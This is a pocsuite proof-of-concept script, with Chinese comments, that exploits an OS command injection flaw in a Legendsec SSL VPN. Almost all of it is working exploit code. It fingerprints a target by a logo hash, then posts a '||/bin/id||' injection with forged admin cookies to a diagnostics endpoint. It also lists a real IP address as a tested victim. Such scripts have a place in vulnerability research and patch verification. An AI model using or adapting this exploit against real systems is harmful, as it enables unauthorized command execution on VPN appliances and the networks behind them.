#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Copyright (c) 2014-2015 pocsuite developers (http://seebug.org)
See the file 'docs/COPYING' for copying permission
"""
#命令行
from pocsuite import pocsuite_cli
#验证模块
from pocsuite import pocsuite_verify
#攻击模块
from pocsuite import pocsuite_attack
#控制台模式
from pocsuite import pocsuite_console
from pocsuite.api.request import req 
from pocsuite.api.poc import register
from pocsuite.api.poc import Output, POCBase
#import logging
#logging.basicConfig(filename='test.log')

class SSL_VPNPOC(POCBase):
    vulID = '17'  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = '1' #默认为1
    vulDate = '2017-11-21' #漏洞公开的时间,不知道就写今天

    author = 'colorway' #  PoC作者的大名
    createDate = '2017-11-21'# 编写 PoC 的日期
    updateDate = '2017-11-21'# PoC 更新的时间,默认和编写时间一样
    references = ''# 漏洞地址来源,0day不用写
    name = 'SSLVPN OS Command Injection'# PoC 名称
    appPowerLink = 'http://www.legendsec.com/newsec.php?up=2&cid=103'# 漏洞厂商主页地址
    appName = 'SSL VPN'# 漏洞应用名称
    appVersion = '< 27940 versions'# 漏洞影响版本
    vulType = 'Command Injection'#漏洞类型,类型参考见 漏洞类型规范表
    desc = '''
        网神 SSL VPN 命令执行漏洞
    ''' # 漏洞简要描述
    samples = ['123.59.208.106']# 测试样列,就是用 PoC 测试成功的网站
    install_requires = [] # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    cvss = u"严重" #严重,高危,中危,低危

    #验证漏洞 pocsuite -r 17-SSLVPN-OS-Injection.py -f ip.txt --verify
    def _verify(self):
        #定义返回结果
        import hashlib
        import re

        result = {}
        #获取漏洞url
        vul_url = self.url + '/admin/maintain/diagnosing_mng.php?op=check&t=1&h=127.0.0.1&p=80&c=1||/bin/id||'
        vul1_url = vul_url.replace('http', 'https')
        test_url = self.url + '/images/logo.gif'
        test1_url = test_url.replace('http', 'https')
        # print test_url
        # print test1_url
        try:
            r = req.get(test_url)
            r1 = req.get(test1_url, verify=False)
            if hashlib.md5(r.content).hexdigest() == 'ee6d00573a196854057bdfcb6817d79c' or hashlib.md5(r1.content).hexdigest() == 'ee6d00573a196854057bdfcb6817d79c':
                data = "mng_type=1&cred_type=1&auth=10&user_name=11&pass=111&subjoin_code=78c7"
                cookies = {'gw_admin_ticket':'aaaa','admin_token':''}
                r2 = req.post(vul_url, data=data, cookies=cookies)
                r3 = req.post(vul1_url, data=data, cookies=cookies, verify=False)
                if "uid" in r2.content or "uid" in r3.content:
                    result['VerifyInfo'] = {}
                    result['VerifyInfo']['URL'] = self.url
                    result['VerifyInfo']['Payload'] = vul_url
        except:
            pass
        print '[+]17 poc done'
        return self.save_output(result)

    #漏洞攻击
    def _attack(self):
        result = {}
        # 攻击代码
        return self._verify()

    def save_output(self, result):
        #判断有无结果并输出
        output = Output(self)
        if result:
            output.success(result)
        else:
            pass
        return output

register(SSL_VPNPOC)

